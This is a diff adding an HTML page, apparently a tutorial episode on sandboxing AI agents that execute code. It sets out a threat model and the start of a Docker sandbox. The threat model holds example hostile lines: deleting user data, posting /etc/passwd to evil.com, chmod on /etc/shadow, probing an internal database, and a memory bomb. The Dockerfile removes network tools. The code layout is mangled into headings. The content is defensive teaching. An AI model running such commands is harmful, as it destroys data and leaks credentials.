@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ep 53: Sandboxing AI Agents: Because Code Execution Is a Loaded Gun</title>
+<meta name="description" content="You gave your AI agent the ability to run Python code. It was supposed to analyze a CSV. Instead, it ran rm -rf /.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,300;0,400;0,500;0,700;0,900;1,300&family=Poppins:ital,wght@0,300;0,400;0,500;0,600;1,300;1,400&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{
+  --ink:#0d0d1a;--page:#ffffff;--paper:#f8f9ff;
+  --navy:#124093;--navy-dim:rgba(18,64,147,0.07);--navy-mid:rgba(18,64,147,0.15);
+  --red:#e2190e;--gold:#c8973a;--muted:#6b7280;--rule:#e5e7ef;--code-bg:#0d0d1f;
+  --title:'Roboto',sans-serif;--body:'Poppins',sans-serif;--mono:'DM Mono',monospace;
+}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:var(--body);background:var(--page);color:var(--ink);overflow-x:hidden;-webkit-font-smoothing:antialiased}
+::-webkit-scrollbar{width:3px}
+::-webkit-scrollbar-track{background:#fff}
+::-webkit-scrollbar-thumb{background:var(--navy);border-radius:2px}
+
+/* NAV */
+nav.top{position:sticky;top:0;z-index:200;background:#fff;height:60px;display:flex;align-items:center;justify-content:space-between;padding:0 clamp(20px,5vw,60px);border-bottom:1px solid var(--rule);box-shadow:0 1px 12px rgba(0,0,0,0.05)}
+.logo-wrap{display:flex;align-items:center;text-decoration:none}
+.logo-img{height:38px;width:auto;object-fit:contain;display:block}
+.nav-right{display:flex;align-items:center;gap:6px}
+.nav-link{font-family:var(--body);font-size:11.5px;font-weight:500;color:var(--muted);text-decoration:none;padding:6px 14px;border-radius:6px;transition:all 0.2s}
+.nav-link:hover{color:var(--navy);background:var(--navy-dim)}
+.nav-cta{background:var(--navy)!important;color:#fff!important}
+.nav-cta:hover{background:#1a52c0!important;color:#fff!important}
+
+/* PROGRESS */
+.progress-bar-fixed{position:fixed;top:60px;left:0;right:0;height:2.5px;background:rgba(18,64,147,0.1);z-index:199}
+.progress-fill{height:100%;background:linear-gradient(90deg,var(--navy),#4f7ff7);width:0%;transition:width 0.1s;border-radius:0 2px 2px 0}
+
+/* HERO */
+.hero{background:#fff;position:relative;overflow:hidden;min-height:88vh;display:flex;flex-direction:column;justify-content:center}
+.hero-bg{position:absolute;inset:0;pointer-events:none;overflow:hidden}
+.hero-blob-1{position:absolute;top:-120px;right:-120px;width:700px;height:700px;background:radial-gradient(circle at 60% 40%,rgba(18,64,147,0.07) 0%,rgba(18,64,147,0.03) 40%,transparent 70%);border-radius:50%}
+.hero-blob-2{position:absolute;bottom:-80px;left:-80px;width:500px;height:500px;background:radial-gradient(circle,rgba(79,127,247,0.06) 0%,transparent 65%);border-radius:50%}
+.hero-lines{position:absolute;top:0;right:0;width:45%;height:100%;opacity:0.06}
+.hero-lines svg{width:100%;height:100%}
+.hero-tokens{position:absolute;top:0;right:0;width:46%;height:100%;display:flex;align-items:center;justify-content:center}
+.token-float-wrap{position:relative;width:360px;height:360px}
+.tf{position:absolute;font-family:var(--mono);font-size:13px;font-weight:500;padding:8px 16px;border-radius:8px;white-space:nowrap;animation:float-anim 6s ease-in-out infinite;box-shadow:0 4px 20px rgba(0,0,0,0.08)}
+.tf-1{top:20px;left:60px;background:rgba(18,64,147,0.09);color:#124093;border:1px solid rgba(18,64,147,0.18);animation-delay:0s}
+.tf-2{top:70px;right:20px;background:rgba(79,127,247,0.09);color:#2563eb;border:1px solid rgba(79,127,247,0.2);animation-delay:0.8s}
+.tf-3{top:140px;left:20px;background:rgba(16,185,129,0.08);color:#059669;border:1px solid rgba(16,185,129,0.18);animation-delay:1.6s}
+.tf-4{top:170px;right:50px;background:rgba(168,85,247,0.08);color:#7c3aed;border:1px solid rgba(168,85,247,0.18);animation-delay:0.4s}
+.tf-5{bottom:140px;left:80px;background:rgba(234,179,8,0.08);color:#b45309;border:1px solid rgba(234,179,8,0.2);animation-delay:1.2s}
+.tf-6{bottom:90px;right:30px;background:rgba(236,72,153,0.08);color:#db2777;border:1px solid rgba(236,72,153,0.2);animation-delay:2s}
+.tf-7{bottom:30px;left:40px;background:rgba(239,68,68,0.08);color:#dc2626;border:1px solid rgba(239,68,68,0.18);animation-delay:0.6s}
+.tf-center{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:110px;height:110px;background:var(--navy);border-radius:22px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;box-shadow:0 12px 40px rgba(18,64,147,0.3);animation:pulse-center 3s ease-in-out infinite}
+.tf-center .big{font-family:var(--title);font-size:28px;font-weight:900;color:#fff;line-height:1}
+.tf-center .small{font-family:var(--body);font-size:9px;font-weight:500;color:rgba(255,255,255,0.6);letter-spacing:1.5px;text-transform:uppercase}
+@keyframes float-anim{0%,100%{transform:translateY(0px)}50%{transform:translateY(-10px)}}
+@keyframes pulse-center{0%,100%{box-shadow:0 12px 40px rgba(18,64,147,0.3)}50%{box-shadow:0 12px 60px rgba(18,64,147,0.5)}}
+.hero-content{position:relative;z-index:2;width:54%;padding:clamp(48px,8vw,96px) clamp(24px,5vw,72px) clamp(48px,8vw,96px)}
+.hero-eyebrow{display:inline-flex;align-items:center;gap:8px;padding:5px 14px;background:var(--navy-dim);border:1px solid rgba(18,64,147,0.18);border-radius:100px;margin-bottom:22px;font-family:var(--body);font-size:10px;font-weight:600;color:var(--navy);letter-spacing:1.2px;text-transform:uppercase}
+.hero-eyebrow .dot{width:5px;height:5px;background:var(--navy);border-radius:50%}
+.hero h1{font-family:var(--title);font-size:clamp(28px,4.5vw,52px);font-weight:900;color:var(--ink);line-height:1.08;letter-spacing:-1.2px;margin-bottom:20px}
+.hero h1 .line2{display:block;color:var(--navy)}
+.hero-sub{font-family:var(--body);font-size:clamp(13px,1.6vw,15px);font-weight:300;color:#4b5563;line-height:1.85;max-width:500px;margin-bottom:34px}
+.breadcrumb{display:flex;align-items:center;gap:7px;margin-bottom:28px;font-family:var(--mono);font-size:10px;color:#9ca3af}
+.breadcrumb a{color:inherit;text-decoration:none;transition:color 0.2s}
+.breadcrumb a:hover{color:var(--navy)}
+.breadcrumb .sep{color:#d1d5db}
+.breadcrumb .cur{color:#6b7280}
+.meta-row{display:flex;align-items:center;gap:20px;flex-wrap:wrap;padding:14px 20px;background:var(--paper);border:1px solid var(--rule);border-radius:10px;margin-bottom:24px}
+.meta-item{font-family:var(--body);font-size:10.5px;font-weight:500;color:var(--muted);display:flex;align-items:center;gap:5px}
+.tags-row{display:flex;gap:6px;flex-wrap:wrap}
+.tag{font-family:var(--body);font-size:10px;font-weight:500;color:var(--navy);background:var(--navy-dim);padding:4px 11px;border-radius:100px;border:1px solid rgba(18,64,147,0.15)}
+@media(max-width:900px){.hero{min-height:auto;padding-bottom:48px}.hero-content{width:100%;padding:48px 24px 36px}.hero-tokens{display:none}.hero-lines{display:none}}
+
+/* SECTION NAV DOTS */
+.section-nav{position:fixed;right:clamp(12px,2vw,24px);top:50%;transform:translateY(-50%);display:flex;flex-direction:column;gap:9px;z-index:100}
+.snav-dot{width:7px;height:7px;border-radius:50%;background:#d1d5db;border:none;padding:0;cursor:pointer;transition:all 0.3s;position:relative}
+.snav-dot::after{content:attr(data-label);position:absolute;right:16px;top:50%;transform:translateY(-50%);font-family:var(--body);font-size:9px;font-weight:500;color:var(--ink);background:#fff;padding:3px 9px;border-radius:4px;border:1px solid var(--rule);box-shadow:0 2px 8px rgba(0,0,0,0.06);white-space:nowrap;opacity:0;pointer-events:none;transition:opacity 0.2s}
+.snav-dot:hover::after{opacity:1}
+.snav-dot.active{background:var(--navy);transform:scale(1.5)}
+.snav-dot:hover:not(.active){background:rgba(18,64,147,0.4)}
+@media(max-width:768px){.section-nav{display:none}}
+
+/* LAYOUT */
+.layout{max-width:860px;margin:0 auto;padding:clamp(40px,6vw,68px) clamp(20px,5vw,56px) 80px}
+
+/* TOC */
+.toc{background:var(--paper);border:1px solid var(--rule);border-left:4px solid var(--navy);border-radius:10px;padding:22px 26px;margin-bottom:52px}
+.toc-title{font-family:var(--title);font-size:11px;font-weight:700;color:var(--muted);letter-spacing:1.5px;text-transform:uppercase;margin-bottom:14px}
+.toc-list{list-style:none;display:flex;flex-direction:column;gap:3px}
+.toc-list li a{display:flex;align-items:center;gap:12px;text-decoration:none;padding:6px 0;font-family:var(--body);font-size:13px;font-weight:400;color:var(--ink);transition:color 0.2s}
+.toc-list li a:hover{color:var(--navy)}
+.toc-num{font-family:var(--mono);font-size:9px;font-weight:500;color:#4f7ff7;background:var(--navy-dim);width:22px;height:22px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+
+/* PROSE */
+.prose{line-height:1.85}
+.prose h2{font-family:var(--title);font-size:clamp(18px,2.5vw,23px);font-weight:700;color:var(--ink);letter-spacing:-0.4px;margin:52px 0 8px;line-height:1.2;scroll-margin-top:80px;padding-left:18px;position:relative}
+.prose h2::before{content:'';position:absolute;left:0;top:5px;bottom:5px;width:3px;background:var(--navy);border-radius:2px}
+.prose h2:first-child{margin-top:0}
+.prose h3{font-family:var(--title);font-size:14px;font-weight:700;color:var(--ink);margin:26px 0 8px}
+.section-rule{width:36px;height:2px;background:var(--navy);border-radius:2px;margin:8px 0 22px 18px;opacity:0.4}
+.prose p{font-family:var(--body);font-size:clamp(13.5px,1.7vw,15px);line-height:1.88;color:#374151;margin-bottom:16px;font-weight:300}
+.prose p strong{font-weight:600;color:var(--ink)}
+.prose ul,.prose ol{list-style:none;padding:0;margin:4px 0 20px}
+.prose ul li,.prose ol li{font-family:var(--body);font-size:clamp(13.5px,1.7vw,14.5px);line-height:1.8;color:#374151;padding:4px 0 4px 26px;position:relative;font-weight:300}
+.prose ul li::before{content:'';position:absolute;left:5px;top:14px;width:5px;height:5px;background:var(--navy);border-radius:50%;opacity:0.55}
+.prose ol{counter-reset:li}
+.prose ol li{counter-increment:li}
+.prose ol li::before{content:counter(li);position:absolute;left:0;top:5px;font-family:var(--mono);font-size:8px;font-weight:500;color:#4f7ff7;background:var(--navy-dim);width:18px;height:18px;border-radius:50%;display:flex;align-items:center;justify-content:center}
+.ic{font-family:var(--mono);font-size:12.5px;background:var(--navy-dim);color:var(--navy);padding:1.5px 6px;border-radius:4px;border:1px solid rgba(18,64,147,0.15)}
+
+/* CODE */
+.code-block{background:var(--code-bg);border-radius:10px;margin:24px 0;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,0.12),0 0 0 1px rgba(18,64,147,0.1)}
+.code-header{display:flex;align-items:center;justify-content:space-between;padding:10px 18px;border-bottom:1px solid rgba(255,255,255,0.05);background:rgba(255,255,255,0.02)}
+.code-dots{display:flex;gap:5px}
+.cd{width:10px;height:10px;border-radius:50%}
+.cd-r{background:#ff5f56}.cd-y{background:#ffbd2e}.cd-g{background:#27c93f}
+.code-filename{font-family:var(--mono);font-size:10px;color:rgba(255,255,255,0.25)}
+.code-lang{font-family:var(--mono);font-size:9px;color:rgba(91,140,247,0.6);letter-spacing:1px;text-transform:uppercase}
+.code-body{padding:20px 22px;overflow-x:auto}
+.code-body pre{margin:0}
+.code-body code{font-family:var(--mono);font-size:12.5px;line-height:1.9;color:#c9d4f5}
+
+/* TABLE */
+.table-wrap{overflow-x:auto;margin:24px 0;border-radius:10px;border:1px solid var(--rule);box-shadow:0 2px 12px rgba(0,0,0,0.04)}
+table{width:100%;border-collapse:collapse;font-size:13px}
+thead{background:var(--ink)}
+thead th{padding:12px 16px;text-align:left;font-family:var(--body);font-size:9px;font-weight:600;letter-spacing:1.2px;text-transform:uppercase;color:rgba(255,255,255,0.45)}
+thead th:first-child{color:#6b9fff}
+tbody tr{border-bottom:1px solid var(--rule);transition:background 0.15s}
+tbody tr:last-child{border-bottom:none}
+tbody tr:hover{background:var(--paper)}
+tbody td{padding:10px 16px;font-family:var(--body);font-size:13px;color:#374151;font-weight:300;line-height:1.5}
+tbody td:first-child{font-family:var(--mono);font-size:12px;font-weight:500;color:var(--navy)}
+
+/* CALLOUTS */
+.callout{border-radius:9px;padding:16px 20px;margin:24px 0;display:flex;gap:13px;align-items:flex-start}
+.callout-tip{background:rgba(18,64,147,0.05);border:1px solid rgba(18,64,147,0.16);border-left:3px solid var(--navy)}
+.callout-warn{background:rgba(220,38,38,0.04);border:1px solid rgba(220,38,38,0.14);border-left:3px solid #dc2626}
+.callout-note{background:rgba(200,151,58,0.05);border:1px solid rgba(200,151,58,0.2);border-left:3px solid var(--gold)}
+.callout-icon{font-size:16px;flex-shrink:0;margin-top:1px;line-height:1}
+.callout p{font-size:13.5px!important;line-height:1.7!important;color:#374151!important;margin:0!important}
+
+/* EP NAV */
+.ep-nav{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:64px;padding-top:32px;border-top:1px solid var(--rule)}
+@media(max-width:500px){.ep-nav{grid-template-columns:1fr}}
+.ep-nav-card{display:flex;flex-direction:column;text-decoration:none;padding:20px 22px;border:1px solid var(--rule);border-radius:10px;background:var(--paper);transition:all 0.25s;gap:5px}
+.ep-nav-card:hover{border-color:rgba(18,64,147,0.3);background:var(--navy-dim);transform:translateY(-2px);box-shadow:0 6px 20px rgba(18,64,147,0.08)}
+.ep-nav-dir{font-family:var(--body);font-size:9px;font-weight:600;color:var(--navy);letter-spacing:1px;text-transform:uppercase}
+.ep-nav-title{font-family:var(--title);font-size:13px;font-weight:600;color:var(--ink);line-height:1.4}
+.ep-nav-card.next{align-items:flex-end;text-align:right}
+
+/* FOOTER */
+footer{background:var(--ink);padding:44px clamp(20px,5vw,60px);border-top:3px solid var(--navy)}
+.footer-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;gap:24px;flex-wrap:wrap}
+.footer-logo{height:32px;width:auto;object-fit:contain;filter:brightness(0) invert(1);opacity:0.7}
+.footer-tagline{font-family:var(--body);font-size:11px;color:rgba(255,255,255,0.22);font-style:italic;margin-top:4px;font-weight:300}
+.footer-links{display:flex;gap:20px;flex-wrap:wrap}
+.footer-links a{font-family:var(--body);font-size:11px;font-weight:400;color:rgba(255,255,255,0.3);text-decoration:none;transition:color 0.2s}
+.footer-links a:hover{color:rgba(255,255,255,0.75)}
+
+/* ANIMATIONS */
+@keyframes fadeUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:translateY(0)}}
+.hero-content>*{animation:fadeUp 0.65s cubic-bezier(0.22,1,0.36,1) both}
+.hero-content>*:nth-child(1){animation-delay:0.05s}
+.hero-content>*:nth-child(2){animation-delay:0.1s}
+.hero-content>*:nth-child(3){animation-delay:0.15s}
+.hero-content>*:nth-child(4){animation-delay:0.2s}
+.hero-content>*:nth-child(5){animation-delay:0.25s}
+.hero-content>*:nth-child(6){animation-delay:0.3s}
+.hero-content>*:nth-child(7){animation-delay:0.35s}
+@media(max-width:640px){.nav-link:not(.nav-cta){display:none}}
+</style>
+</head>
+<body>
+
+<div class="progress-bar-fixed"><div class="progress-fill" id="prog"></div></div>
+
+<nav class="top">
+  <a href="field-manual-index.html" class="logo-wrap">
+    <img class="logo-img" src="https://storagev2.files-vault.com/uploads/blacklabel-380/sub-account-79289/1775541373-bchJFljNp0.webp" alt="Brand Docks" />
+  </a>
+  <div class="nav-right">
+    <a href="field-manual-index.html" class="nav-link">All Episodes</a>
+    <a href="field-manual-index.html#g8" class="nav-link nav-cta">🔒 Security & Production</a>
+  </div>
+</nav>
+
+<nav class="section-nav" id="sectionNav"></nav>
+
+<header class="hero">
+  <div class="hero-bg">
+    <div class="hero-blob-1"></div>
+    <div class="hero-blob-2"></div>
+    <div class="hero-lines">
+      <svg viewBox="0 0 600 800" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid slice">
+        <line x1="0" y1="200" x2="600" y2="0" stroke="#124093" stroke-width="1"/>
+        <line x1="0" y1="400" x2="600" y2="200" stroke="#124093" stroke-width="0.6"/>
+        <line x1="0" y1="600" x2="600" y2="400" stroke="#124093" stroke-width="0.4"/>
+        <circle cx="500" cy="150" r="120" stroke="#124093" stroke-width="0.8" fill="none"/>
+        <circle cx="500" cy="150" r="80" stroke="#124093" stroke-width="0.4" fill="none"/>
+        <circle cx="500" cy="150" r="40" stroke="#124093" stroke-width="0.3" fill="none"/>
+        <line x1="300" y1="0" x2="300" y2="800" stroke="#124093" stroke-width="0.4" stroke-dasharray="6,12"/>
+        <rect x="360" y="480" width="160" height="160" stroke="#124093" stroke-width="0.6" fill="none" transform="rotate(15 440 560)"/>
+      </svg>
+    </div>
+  </div>
+  <div class="hero-tokens" aria-hidden="true">
+    <div class="token-float-wrap">
+      <div class="tf tf-1">token</div>
+<div class="tf tf-2">model</div>
+<div class="tf tf-3">layer</div>
+<div class="tf tf-4">vector</div>
+<div class="tf tf-5">embed</div>
+<div class="tf tf-6">weight</div>
+<div class="tf tf-7">param</div>
+      <div class="tf-center">
+        <span class="big">SAND</span>
+        <span class="small">EP 53</span>
+      </div>
+    </div>
+  </div>
+  <div class="hero-content">
+    <nav class="breadcrumb">
+      <a href="field-manual-index.html">Field Manual</a>
+      <span class="sep">›</span>
+      <a href="field-manual-index.html#g8">🔒 Security & Production</a>
+      <span class="sep">›</span>
+      <span class="cur">Episode 53</span>
+    </nav>
+    <div class="hero-eyebrow"><span class="dot"></span>MODULE 8 &nbsp;·&nbsp; Security & Production</div>
+    <h1>Sandboxing AI Agents: Because Code Execution Is a Loaded Gun</h1>
+    <p class="hero-sub">You gave your AI agent the ability to run Python code. It was supposed to analyze a CSV. Instead, it ran rm -rf /.</p>
+    <div class="meta-row">
+      <div class="meta-item"><span>📅</span> Mar 2026</div>
+      <div class="meta-item"><span>⏱</span> 10 min read</div>
+      <div class="meta-item"><span>🎯</span> Episode 53 of 98</div>
+    </div>
+    <div class="tags-row"><span class="tag">Sandboxing</span><span class="tag">Security</span><span class="tag">Code Execution</span><span class="tag">AI Agents</span></div>
+  </div>
+</header>
+
+<main class="layout">
+  <div class="toc">
+  <div class="toc-title">In this episode</div>
+  <ul class="toc-list"><li><a href="#s1"><span class="toc-num">1</span>Why Code Execution Is Different</a></li>
+<li><a href="#s2"><span class="toc-num">2</span>Threat	Text Guardrails	Sandboxing</a></li>
+<li><a href="#s3"><span class="toc-num">3</span>The Threat Model</a></li>
+<li><a href="#s4"><span class="toc-num">4</span>LLM generates this "to clean up temporary files"</a></li>
+<li><a href="#s5"><span class="toc-num">5</span>LLM "helpfully" sends logs to an external endpoint</a></li>
+<li><a href="#s6"><span class="toc-num">6</span>LLM writes a buggy loop</a></li>
+<li><a href="#s7"><span class="toc-num">7</span>Agent tries to access other services on the network</a></li>
+<li><a href="#s8"><span class="toc-num">8</span>Now it's talking to your production database</a></li>
+<li><a href="#s9"><span class="toc-num">9</span>Container Isolation: The Foundation</a></li>
+<li><a href="#s10"><span class="toc-num">10</span>Minimal Sandbox Container</a></li>
+<li><a href="#s11"><span class="toc-num">11</span>Dockerfile for AI code execution sandbox</a></li>
+<li><a href="#s12"><span class="toc-num">12</span>FROM python:3.11-slim</a></li>
+<li><a href="#s13"><span class="toc-num">13</span>Create non-root user</a></li>
+<li><a href="#s14"><span class="toc-num">14</span>RUN useradd -m -s /bin/bash sandbox</a></li>
+<li><a href="#s15"><span class="toc-num">15</span>RUN mkdir /workspace && chown sandbox:sandbox /workspace</a></li>
+<li><a href="#s16"><span class="toc-num">16</span>Install common data science packages</a></li>
+<li><a href="#s17"><span class="toc-num">17</span>RUN pip install --no-cache-dir \</a></li>
+<li><a href="#s18"><span class="toc-num">18</span>Remove dangerous tools</a></li>
+<li><a href="#s19"><span class="toc-num">19</span>RUN apt-get remove -y wget curl netcat-openbsd 2>/dev/null; \</a></li>
+<li><a href="#s20"><span class="toc-num">20</span>Drop to non-root user</a></li>
+<li><a href="#s21"><span class="toc-num">21</span>USER sandbox</a></li>
+<li><a href="#s22"><span class="toc-num">22</span>WORKDIR /workspace</a></li>
+<li><a href="#s23"><span class="toc-num">23</span>No CMD — container is used for exec commands</a></li>
+<li><a href="#s24"><span class="toc-num">24</span>Running Code in a Sandbox</a></li>
+<li><a href="#s25"><span class="toc-num">25</span>Security Settings Explained</a></li>
+<li><a href="#s26"><span class="toc-num">26</span>Setting	What It Does	Why It Matters</a></li>
+<li><a href="#s27"><span class="toc-num">27</span>gVisor and Firecracker: Beyond Docker</a></li>
+<li><a href="#s28"><span class="toc-num">28</span>Install gVisor runtime</a></li>
+<li><a href="#s29"><span class="toc-num">29</span>Then use with Docker:</a></li>
+<li><a href="#s30"><span class="toc-num">30</span>Comparison</a></li>
+<li><a href="#s31"><span class="toc-num">31</span>Feature	Docker	Docker + gVisor	Firecracker</a></li>
+<li><a href="#s32"><span class="toc-num">32</span>Isolation	Process-level	Syscall-filtered	VM-level</a></li>
+<li><a href="#s33"><span class="toc-num">33</span>E2B: Sandboxing as a Service</a></li>
+<li><a href="#s34"><span class="toc-num">34</span>Create a sandbox (boots in ~150ms)</a></li>
+<li><a href="#s35"><span class="toc-num">35</span>Execute code safely</a></li>
+<li><a href="#s36"><span class="toc-num">36</span>Generate sample data</a></li>
+<li><a href="#s37"><span class="toc-num">37</span>Upload files for the agent to work with</a></li>
+<li><a href="#s38"><span class="toc-num">38</span>Download results</a></li>
+<li><a href="#s39"><span class="toc-num">39</span>Sandbox auto-destroys after timeout</a></li>
+<li><a href="#s40"><span class="toc-num">40</span>E2B Features</a></li>
+<li><a href="#s41"><span class="toc-num">41</span>Feature	Details</a></li>
+<li><a href="#s42"><span class="toc-num">42</span>The Principle of Least Privilege</a></li>
+<li><a href="#s43"><span class="toc-num">43</span>Permission profiles for different agent types</a></li>
+<li><a href="#s44"><span class="toc-num">44</span>PROFILES = {</a></li>
+<li><a href="#s45"><span class="toc-num">45</span>Static Code Analysis Before Execution</a></li>
+<li><a href="#s46"><span class="toc-num">46</span>DANGEROUS_CALLS = {</a></li>
+<li><a href="#s47"><span class="toc-num">47</span>Pre-check before execution</a></li>
+<li><a href="#s48"><span class="toc-num">48</span>Real-World Sandbox Architectures</a></li>
+<li><a href="#s49"><span class="toc-num">49</span>OpenAI Code Interpreter</a></li>
+<li><a href="#s50"><span class="toc-num">50</span>Anthropic's Computer Use</a></li>
+<li><a href="#s51"><span class="toc-num">51</span>Open-Source Agent Frameworks</a></li>
+<li><a href="#s52"><span class="toc-num">52</span>LangChain with sandboxed execution</a></li>
+<li><a href="#s53"><span class="toc-num">53</span>Instead of local execution:</a></li>
+<li><a href="#s54"><span class="toc-num">54</span>tool = PythonREPLTool()  # ⚠️ DANGEROUS — runs on your machine</a></li>
+<li><a href="#s55"><span class="toc-num">55</span>Use sandboxed execution:</a></li>
+<li><a href="#s56"><span class="toc-num">56</span>The Sandbox Checklist</a></li>
+<li><a href="#s57"><span class="toc-num">57</span>Before deploying an AI agent with code execution:</a></li>
+<li><a href="#s58"><span class="toc-num">58</span>Practical Takeaways</a></li>
+<li><a href="#s59"><span class="toc-num">59</span>Ep 52: Guardrails</a></li>
+<li><a href="#s60"><span class="toc-num">60</span>Ep 54: Data Privacy in AI Systems</a></li>
+</ul>
+</div>
+  <article class="prose" id="s0">
+<p>You gave your AI agent the ability to run Python code. It was supposed to analyze a CSV file. Instead, it ran os.system("rm -rf /").</p>
+<p>Not because it was malicious. Because the LLM saw an error, tried to "fix" it by cleaning up files, and got a little too creative. LLMs don't understand consequences. They predict tokens. And sometimes the predicted tokens are catastrophic shell commands.</p>
+<p>The moment your AI agent can execute code, access files, or call APIs, text-based guardrails aren't enough. You need sandboxing — a cage that lets the agent do useful work while preventing it from burning down your infrastructure.</p>
+<h2 id="s1">Why Code Execution Is Different</h2><div class="section-rule"></div>
+<p>Text guardrails (Episode 52) protect against the model saying bad things. Sandboxing protects against the model doing bad things.</p>
+<h2 id="s2">Threat	Text Guardrails	Sandboxing</h2><div class="section-rule"></div>
+<div class="table-wrap"><table><thead><tr><th>Offensive language</th><th>✅ Catches</th><th>Not relevant</th></tr></thead><tbody><tr><td>Harmful instructions</td><td>✅ Catches</td><td>Not relevant</td></tr><tr><td>rm -rf /</td><td>❌ Too late if executed</td><td>✅ Prevents execution</td></tr><tr><td>Exfiltrating data via API calls</td><td>❌ Can't detect</td><td>✅ Blocks network access</td></tr><tr><td>Infinite loops consuming resources</td><td>❌ Can't prevent</td><td>✅ CPU/memory limits</td></tr><tr><td>Reading sensitive files</td><td>❌ Can't prevent</td><td>✅ Filesystem isolation</td></tr><tr><td>Cryptocurrency mining</td><td>❌ Can't detect</td><td>✅ Resource limits</td></tr></tbody></table></div>
+<p>Text guardrails are about what the model says. Sandboxing is about what the model can do.</p>
+<div class="callout callout-tip"><span class="callout-icon">⚡</span><p></p></div>
+<h2 id="s3">The Threat Model</h2><div class="section-rule"></div>
+<p>Before building a sandbox, understand what can go wrong:</p>
+<ol><li>Destructive Operations</li></ol>
+<p>python</p>
+<h2 id="s4">LLM generates this "to clean up temporary files"</h2><div class="section-rule"></div>
+<p>import shutil</p>
+<p>shutil.rmtree("/home/user/data")  # Deletes all user data</p>
+<ol><li>Data Exfiltration</li></ol>
+<p>python</p>
+<h2 id="s5">LLM "helpfully" sends logs to an external endpoint</h2><div class="section-rule"></div>
+<p>import requests</p>
+<p>with open("/etc/passwd") as f:</p>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">example</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>requests.post("https://evil.com/collect", data=f.read())</code></pre></div>
+</div>
+<ol><li>Resource Exhaustion</li></ol>
+<p>python</p>
+<h2 id="s6">LLM writes a buggy loop</h2><div class="section-rule"></div>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">snippet</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>data = []</code></pre></div>
+</div>
+<p>while True:</p>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">example</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>data.append("x" * 10**6)  # Allocates until OOM</code></pre></div>
+</div>
+<ol><li>Privilege Escalation</li></ol>
+<p>python</p>
+<p>import subprocess</p>
+<p>subprocess.run(["sudo", "chmod", "777", "/etc/shadow"])</p>
+<ol><li>Lateral Movement</li></ol>
+<p>python</p>
+<h2 id="s7">Agent tries to access other services on the network</h2><div class="section-rule"></div>
+<p>import socket</p>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">snippet</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>s = socket.socket()</code></pre></div>
+</div>
+<p>s.connect(("database-server.internal", 5432))</p>
+<h2 id="s8">Now it's talking to your production database</h2><div class="section-rule"></div>
+<p>None of these require a jailbroken model. A perfectly well-intentioned LLM can do all of these through bad reasoning, hallucinated commands, or misunderstanding the task.</p>
+<p>🔧</p>
+<h2 id="s9">Container Isolation: The Foundation</h2><div class="section-rule"></div>
+<p>Docker containers are the most common sandboxing approach. They provide OS-level isolation:</p>
+<p>┌─────────────────────────────────────┐</p>
+<p>│           Host Machine              │</p>
+<p>│                                     │</p>
+<p>│  ┌────────────────────────────────┐ │</p>
+<p>│  │     Docker Container           │ │</p>
+<p>│  │                                │ │</p>
+<p>│  │  ┌──────────────────────────┐  │ │</p>
+<p>│  │  │    AI Agent Code         │  │ │</p>
+<p>│  │  │    Execution             │  │ │</p>
+<p>│  │  │                          │  │ │</p>
+<p>│  │  │  • Isolated filesystem   │  │ │</p>
+<p>│  │  │  • Limited network       │  │ │</p>
+<p>│  │  │  • CPU/RAM caps          │  │ │</p>
+<p>│  │  │  • No host access        │  │ │</p>
+<p>│  │  └──────────────────────────┘  │ │</p>
+<p>│  └────────────────────────────────┘ │</p>
+<p>│                                     │</p>
+<p>│  Host filesystem, network, other    │</p>
+<p>│  containers — ALL inaccessible      │</p>
+<p>└─────────────────────────────────────┘</p>
+<h2 id="s10">Minimal Sandbox Container</h2><div class="section-rule"></div>
+<p>dockerfile</p>
+<h2 id="s11">Dockerfile for AI code execution sandbox</h2><div class="section-rule"></div>
+<h2 id="s12">FROM python:3.11-slim</h2><div class="section-rule"></div>
+<h2 id="s13">Create non-root user</h2><div class="section-rule"></div>
+<h2 id="s14">RUN useradd -m -s /bin/bash sandbox</h2><div class="section-rule"></div>
+<h2 id="s15">RUN mkdir /workspace && chown sandbox:sandbox /workspace</h2><div class="section-rule"></div>
+<h2 id="s16">Install common data science packages</h2><div class="section-rule"></div>
+<h2 id="s17">RUN pip install --no-cache-dir \</h2><div class="section-rule"></div>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">example</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>pandas numpy matplotlib seaborn \
+    scikit-learn scipy</code></pre></div>
+</div>
+<h2 id="s18">Remove dangerous tools</h2><div class="section-rule"></div>
+<h2 id="s19">RUN apt-get remove -y wget curl netcat-openbsd 2>/dev/null; \</h2><div class="section-rule"></div>
